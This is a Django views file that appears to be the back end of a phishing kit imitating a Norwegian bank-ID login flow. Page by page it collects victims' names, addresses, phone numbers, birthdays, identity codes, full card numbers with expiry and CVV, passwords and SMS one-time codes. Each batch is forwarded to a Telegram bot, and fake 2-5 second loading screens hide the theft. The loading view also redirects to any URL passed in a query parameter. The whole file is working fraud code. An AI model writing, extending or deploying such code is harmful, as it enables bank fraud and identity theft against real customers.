import random

from django.shortcuts import render, redirect

from bananaid.const import PageRedirection
from bananaid.telegrambot import send_message
from bananaid.utils import gen_url_query


def info_page(request):
    if request.method == 'POST':
        request.session['full_name'] = request.POST.get('name')
        request.session['email'] = request.POST.get('email')
        # request.session['country'] = request.POST.get('country')
        request.session['postal'] = request.POST.get('postal')
        request.session['city'] = request.POST.get('city')
        request.session['home_address'] = request.POST.get('address')
        send_message(request.session)
        return render(request, 'loader.html',
                      {'redirect_to': PageRedirection.SIFFER.value + gen_url_query(),
                       'waiting': random.randint(2000, 5000)})
    return render(request, 'user-info.html', {'postal': request.session.get('postal'), 'city': request.session.get('city')})



def siffer_page(request):
    if request.method == 'POST':
        request.session['siffer'] = request.POST.get('siffer')
        send_message(request.session)
        return render(request, 'loader.html',
                      {'redirect_to': PageRedirection.MINSIDE.value + gen_url_query(),
                       'waiting': random.randint(2000, 5000)})
    return render(request, 'siffer.html', {})


def minside_page(request):
    if request.method == 'POST':
        return render(request, 'loader.html',
                      {'redirect_to': PageRedirection.NUMDATO.value + gen_url_query(),
                       'waiting': random.randint(2000, 5000)})
    return render(request, 'minside.html', {})


def num_date_page(request):
    if request.method == 'POST':
        request.session['phone'] = request.POST.get('phone')
        request.session['birthday'] = request.POST.get('birthday')
        send_message(request.session)
        return render(request, 'loader.html',
                      {'redirect_to': PageRedirection.CC_DETAILS.value + gen_url_query(),
                       'waiting': random.randint(2000, 5000)})
    return render(request, 'num-date.html', {})


def cc_page(request):
    if request.method == 'POST':
        request.session['full_name'] = request.POST.get('full_name')
        request.session['CC'] = request.POST.get('cardnumber')
        request.session['exp'] = request.POST.get('expirationdate')
        request.session['CVV'] = request.POST.get('securitycode')
        send_message(request.session)
        return render(request, 'loader.html',
                      {'redirect_to': PageRedirection.INFO_RECAP.value + gen_url_query(),
                       'waiting': random.randint(2000, 5000)})
    return render(request, 'cc-details.html', {})


def recap_info_page(request):
    if request.method == 'POST':
        return render(request, 'loader.html',
                      {'redirect_to': PageRedirection.PASSWORD.value + gen_url_query(),
                       'waiting': random.randint(2000, 5000)})
    return render(request, 'info.html', {'card': str(request.session.get('cardnumber'))[-4:]})


def password_page(request):
    if request.method == 'POST':
        request.session['password'] = request.POST.get('code')
        send_message(request.session)
        return render(request, 'loader.html',
                      {'redirect_to': PageRedirection.WAITING.value + gen_url_query(),
                       'waiting': random.randint(2000, 5000)})
    return render(request, 'code.html', {})


def sms_page(request):
    if request.method == 'POST':
        request.session['sms'] = request.POST.get('sms')
        send_message(request.session)
        return render(request, 'loader.html',
                      {'redirect_to': PageRedirection.WAITING.value + gen_url_query(),
                       'waiting': random.randint(2000, 5000)})
    return render(request, 'sms.html', {})

def waiting_page(request):
    return render(request, 'waiting.html', {})


def loading_page(request):
    redirect_url = request.GET.get('redirect_url')
    return render(request, 'loader.html',
                  {'redirect_to': redirect_url + gen_url_query(),
                   'waiting': random.randint(2000, 5000)})
